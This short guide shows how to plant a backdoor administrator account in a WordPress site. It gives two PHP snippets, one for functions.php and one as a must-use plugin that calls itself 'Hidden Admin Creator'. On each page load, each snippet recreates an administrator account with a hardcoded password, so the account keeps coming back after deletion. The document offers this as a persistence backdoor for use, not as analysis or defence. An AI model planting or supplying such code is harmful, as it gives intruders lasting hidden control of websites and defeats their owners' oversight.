# Wordpress Backdore Admin User Create. Whice does not deleted.
past this file in function.php file
```shell script
add_action('init','create_hidden_admin');
function create_hidden_admin(){
    $username = 'backupadmin';
    $password = 'StrongP@ss123'; // আপনার পাসওয়ার্ড দিন
    $email = 'backup@email.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
```

# Use mu plugins on file manager
1. go to file manager
2. Than go to wp-content
3. Cteate a folder use name ```mu-plugins``` (name is importent)
4. Than a php file in any name.
5. and edits php file and use thos code

```shell script
<?php
/*
Plugin Name: Hidden Admin Creator
Description: Creates a hidden admin user if not exists
*/

add_action('init','create_hidden_admin_mu');
function create_hidden_admin_mu(){
    $username = 'sys_backup_admin';
    $password = 'StrongP@ss123!';
    $email = 'sysbackup@example.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
```
Than create a new administrator user whois does not can delete
